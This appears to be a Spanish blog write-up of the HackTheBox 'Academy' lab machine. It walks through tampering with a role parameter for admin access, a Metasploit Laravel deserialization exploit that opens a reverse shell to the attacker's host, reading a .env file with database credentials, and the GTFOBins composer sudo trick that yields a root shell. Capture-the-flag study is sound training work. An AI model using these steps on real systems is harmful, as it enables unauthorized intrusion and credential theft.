---
layout      : post
title       : "Academy - HackTheBox"
author      : elc4br4
image       : assets/images/HTB/Academy-HackTheBox/Academy.webp
category    : [ htb ]
tags        : [ Linux ]
---

En esta ocasión vamos a resolver una máquina Linux de nivel Easy en la que tocaremos un poco de Laravel, logs y escalaremos privilegios a través de un binario⚡

![](/assets/images/HTB/Academy-HackTheBox/rating-academy.png)

[![HTBadge](https://www.hackthebox.eu/badge/image/533771)](https://www.hackthebox.com/home/users/profile/533771)

# Reconocimiento de Puertos

```bash
PORT   STATE SERVICE    VERSION
22/tcp open  tcpwrapped
| ssh-hostkey: 
|   3072 c0:90:a3:d8:35:25:6f:fa:33:06:cf:80:13:a0:a5:53 (RSA)
|   256 2a:d5:4b:d0:46:f0:ed:c9:3c:8d:f6:5d:ab:ae:77:96 (ECDSA)
|_  256 e1:64:14:c3:cc:51:b2:3b:a6:28:a7:b1:ae:5f:45:35 (ED25519)
80/tcp open  tcpwrapped
|_http-title: Did not follow redirect to http://academy.htb/
|_http-server-header: Apache/2.4.41 (Ubuntu)
3060/tcp open  mysqlx?
| fingerprint-strings: 
|   DNSStatusRequestTCP, LDAPSearchReq, NotesRPC, SSLSessionReq, TLSSessionReq
``` 



El escaneo nmap revela que tenemos un Servidor OpenSSH corriendo en el puerto 22.
También revela que tenemos el puerto 80 abierto en el cual corre un servidor Apache con una web bajo el nombre de "Hack The Box Academy".
Además tenemos el puerto 33060 en el cual corre un servidor MySQL.


# Enumeración Web

Al acceder a la web a través de la ip nos redirige a http://academy.htb, que lo añadiremos al archivo hosts


`` sudo echo "10.10.10.215 academy.htb" >> /etc/hosts ``


Una vez lo añadimos ya podemos acceder a la web.


![](/assets/images/HTB/Academy-HackTheBox/web.png)


Encuentro la opción Register en la que me creo una cuenta, una vez creada me encuentro con el panel en el que se ubican los modulos de HTB Academy, pero anda que pueda aprovechar.

![](/assets/images/HTB/Academy-HackTheBox/web2.png)


Pr lo tanto vuelvo hacia atrás y decido capturar la petición de registro con BurpSuite.

![](/assets/images/HTB/Academy-HackTheBox/burp1.png)


```burp
POST /register.php HTTP/1.1
Host: academy.htb
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://academy.htb/register.php
Content-Type: application/x-www-form-urlencoded
Content-Length: 53
Origin: http://academy.htb
DNT: 1
Connection: close
Cookie: PHPSESSID=2qamfqs6cs7r1bsu9jktbf3hsu
Upgrade-Insecure-Requests: 1


uid=elc4br4&password=elc4br4&confirm=elc4br4&roleid=0
```

Si nos fijamos tenemos el parámetro `roleid`, que está fijado en 0, pero si lo cambiamos podemos ver si ocurre algo


```burp
uid=elc4br4&password=elc4br4&confirm=elc4br4&roleid=1
```

Si cambiamos el parámetro, enviamos la respuesta y abrimos la url [http://academy.htb/admin.php](http://academy.htb/admin.php) y nos logueamos con la cuenta que hemos creado y accedemos a la web como admin.

Encontramos cosas interesantes... 🤗

![](/assets/images/HTB/Academy-HackTheBox/web3.png)


``Complete initial set of modules (cry0l1t3 / mrb3n)``  --> Dos posibles usuarios

``Fix issue with dev-staging-01.academy.htb`` --> otro host

> Añadimos el host a al archivo hosts


`` sudo echo "10.10.10.215 dev-staging-01.academy.htb" >> /etc/hosts ``


Accedemos y encontramos un montón de errores.

![](/assets/images/HTB/Academy-HackTheBox/web4.png)


![](/assets/images/HTB/Academy-HackTheBox/web5.png)


Si nos fijamos bien veremos que aparece en mcuhas ocasiones la palabra `laravel`

Buscando exploits para PHP Laravel encuentro esto

``PHP Laravel Framework 5.5.40 / 5.6.x < 5.6.30 - token Unserialize Remote Command Execution (Metasploit)                               | linux/remote/47129.rb``

Abro metasploit y procedo a configurar y lanzar el exploit

![](/assets/images/HTB/Academy-HackTheBox/metasploit.png)


Y lanzamos el exploit

```bash
msf6 exploit(unix/http/laravel_token_unserialize_exec) > exploit

[*] Started reverse TCP handler on 10.10.14.5:4441 
[*] Command shell session 1 opened (10.10.14.5:4441 -> 10.10.10.215:49452) at 2022-09-11 18:35:12 +0200
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
whoami
www-data
```

Tras enumerar durante un buen rato, encuentro en la ruta /var/www/html/academy/.env credenciales que podría servirnos para loguearnos a través de ssh.

```bash
www-data@academy:/var/www/html/academy$ cat .env
APP_NAME=Laravel
APP_ENV=local
APP_KEY=base64:dBLUaMuZz7Iq06XtL/Xnz/90Ejq+DEEynggqubHWFj0=
APP_DEBUG=false
APP_URL=http://localhost

LOG_CHANNEL=stack

DB_CONNECTION=mysql
DB_HOST=127.0.0.1
DB_PORT=3306
DB_DATABASE=academy
DB_USERNAME=dev
DB_PASSWORD=mySup3rP4s5w0rd!!
```

Probamos a loguearnos con el usuario cry0l1t3 que encontramos anteriormente en el servidor web.

`ssh cry0l1t3@10.10.10.215`

![](/assets/images/HTB/Academy-HackTheBox/user.png)


Si nos fijamos bien el usuario cry0l1t3 está dentro del grupo adm.


Realizando una breve búsqueda en internet encuentro la siguiente información

![](/assets/images/HTB/Academy-HackTheBox/escaladavertical.png)

Leemos los logs en busca de información y encuentro data en hexadcimal que voy decodeando poco a poco, hasta que encuentro una posible contraseña del usuario mrb3n

![](/assets/images/HTB/Academy-HackTheBox/hexadecimal.png)


```bash
$ su mrb3n 
Password: 
$ id
uid=1001(mrb3n) gid=1001(mrb3n) groups=1001(mrb3n)
$ whoami
mrb3n
```

A continuación ya debemos intentar escalar al usuario root, comenzando por la búsqueda de posibles vectores de escalada, entre ellos pruebo con `sudo -l`

![](/assets/images/HTB/Academy-HackTheBox/escaladaroot.png)


Como vemos tenemos el binario composer que podemos ejecutar como root.

Como de costumbre me dirijo a la siguiente fuente:

[https://gtfobins.github.io/gtfobins/composer/](https://gtfobins.github.io/gtfobins/composer/)

![](/assets/images/HTB/Academy-HackTheBox/gtfobins.png)

EJECUTAMOS LO SIGUIENTE 

```bash
$ TF=$(mktemp -d)
$ echo '{"scripts":{"x":"/bin/sh -i 0<&3 1>&3 2>&3"}}' >$TF/composer.json
$ sudo composer --working-dir=$TF run-script x
PHP Warning:  PHP Startup: Unable to load dynamic library 'mysqli.so' (tried: /usr/lib/php/20190902/mysqli.so (/usr/lib/php/20190902/mysqli.so: undefined symbol: mysqlnd_global_stats), /usr/lib/php/20190902/mysqli.so.so (/usr/lib/php/20190902/mysqli.so.so: cannot open shared object file: No such file or directory)) in Unknown on line 0
PHP Warning:  PHP Startup: Unable to load dynamic library 'pdo_mysql.so' (tried: /usr/lib/php/20190902/pdo_mysql.so (/usr/lib/php/20190902/pdo_mysql.so: undefined symbol: mysqlnd_allocator), /usr/lib/php/20190902/pdo_mysql.so.so (/usr/lib/php/20190902/pdo_mysql.so.so: cannot open shared object file: No such file or directory)) in Unknown on line 0
Do not run Composer as root/super user! See https://getcomposer.org/root for details
> /bin/sh -i 0<&3 1>&3 2>&3
# id
uid=0(root) gid=0(root) groups=0(root)
# whoami
root
```



